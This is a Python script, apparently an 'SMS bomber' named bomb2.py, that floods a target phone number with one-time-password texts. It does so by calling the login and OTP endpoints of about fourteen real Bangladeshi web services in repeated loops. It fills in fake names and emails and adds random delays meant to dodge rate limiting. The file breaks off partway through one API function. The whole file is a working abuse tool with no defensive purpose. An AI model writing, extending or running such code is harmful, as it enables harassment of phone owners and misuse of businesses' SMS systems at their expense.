import requests
import json
import time
import random
import os
from colorama import Fore, Back, Style, init
from pyfiglet import Figlet
import threading

# Initialize colorama
init(autoreset=True)bomb2.py

class OTPSender:
    def __init__(self):
        self.headers = {
            'User-Agent': 'okhttp/3.9.1',
            'Accept-Encoding': 'gzip',
            'Content-Type': 'application/json',
        }
        self.apis = [
            self.api1_eonbazar,
            self.api2_shikho,
            self.api3_bioscopeplus,
            self.api4_rokomari,
            self.api5_bioscopeplus_en,
            self.api6_ecourier,
            self.api7_hishabpati,
            self.api8_doctime,
            self.api9_pbs,
            self.api10_paperfly,
            self.api11_osudpotro,
            self.api12_ajkerdeal,
            self.api13_quizgiri,
            self.api14_easy
        ]
        
        self.api_names = [
            "EonBazar",
            "Shikho",
            "BioscopePlus",
            "Rokomari",
            "BioscopePlus EN",
            "eCourier",
            "Hishabpati",
            "DocTime",
            "PBS",
            "PaperFly",
            "Osudpotro",
            "AjkerDeal",
            "QuizGiri",
            "Easy"
        ]
    
    def send_sms(self, api_func, phone, count, api_index):
        successes = 0
        for i in range(count):
            try:
                response = api_func(phone)
                status = f"{Fore.GREEN}SUCCESS{Style.RESET_ALL}" if response.status_code == 200 else f"{Fore.RED}FAILED{Style.RESET_ALL}"
                print(f"{Fore.CYAN}[API {api_index+1:2d}] {Fore.YELLOW}{self.api_names[api_index]:15} {Fore.WHITE}- {Fore.MAGENTA}Attempt {i+1:2d}/{count}: {status} {Fore.WHITE}(Code: {response.status_code})")
                
                if response.status_code == 200:
                    successes += 1
            except Exception as e:
                print(f"{Fore.CYAN}[API {api_index+1:2d}] {Fore.YELLOW}{self.api_names[api_index]:15} {Fore.WHITE}- {Fore.MAGENTA}Attempt {i+1:2d}/{count}: {Fore.RED}ERROR {Fore.WHITE}({str(e)})")
            
            # Random delay to avoid rate limiting
            time.sleep(random.uniform(0.5, 1.5))
        return successes

    # API implementations
    def api1_eonbazar(self, phone):
        url = "https://app.eonbazar.com/api/auth/login"
        payload = {
            "password": "helloq",
            "mobile": phone,
            "name": "Test User",
            "email": f"test{random.randint(1000,9999)}@gmail.com"
        }
        return requests.post(url, data=json.dumps(payload), headers=self.headers, timeout=10)
    
    def api2_shikho(self, phone):
        url = "https://api.shikho.com/auth/v2/send/sms"
        payload = {
            "auth_type": "login",
            "phone": phone,
            "vendor": "shikho",
            "type": "student"
        }
        return requests.post(url, data=json.dumps(payload), headers=self.headers, timeout=10)
    
    def api3_bioscopeplus(self, phone):
        url = f"https://www.bioscopeplus.com/login/send-otp?phone=880{phone[1:]}"
        return requests.get(url, headers=self.headers, timeout=10)
    
    def api4_rokomari(self, phone):
        url = f"https://www.rokomari.com/otp/send?emailOrPhone={phone}&countryCode=BD"
        custom_headers = self.headers.copy()
        custom_headers['content-type'] = "application/x-www-form-urlencoded"
        custom_headers['content-length'] = "0"
        return requests.post(url, headers=custom_headers, timeout=10)
    
    def api5_bioscopeplus_en(self, phone):
        url = f"https://www.bioscopeplus.com/en/login/send-otp?phone=880{phone[1:]}"
        return requests.get(url, headers=self.headers, timeout=10)
    
    def api6_ecourier(self, phone):
        url = f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}"
        custom_headers = self.headers.copy()
        custom_headers['Connection'] = "Keep-Alive"
        return requests.get(url, headers=custom_headers, timeout=10)
    
    def api7_hishabpati(self, phone):
        url = "https://api.hishabpati.com/api/v1/merchant/register/otp"
        payload = {
            "business_name": "Test Business",
            "last_name": "User",
            "phone_number": phone,
            "first_name": "Test"
        }
        return requests.post(url, data=json.dumps(payload), headers=self.headers, timeout=10)
    
    def api8_doctime(self, phone):
        url = "https://admin.doctime.com.bd/api/otp/send"
        payload = {
            "contact": phone
        }
        return requests.post(url, data=json.dumps(payload), headers=self.headers, timeout=10)
    
    def api9_pbs(self, phone):
        url = "https://pbs.com.bd/login/?handler=UserGetOtp"
        payload = {
            "MobileNo": phone,
            "UserName": f"user{random.randint(100,999)}",
            "chkRememberPassword": f"pass{random.randint(1000,9999)}"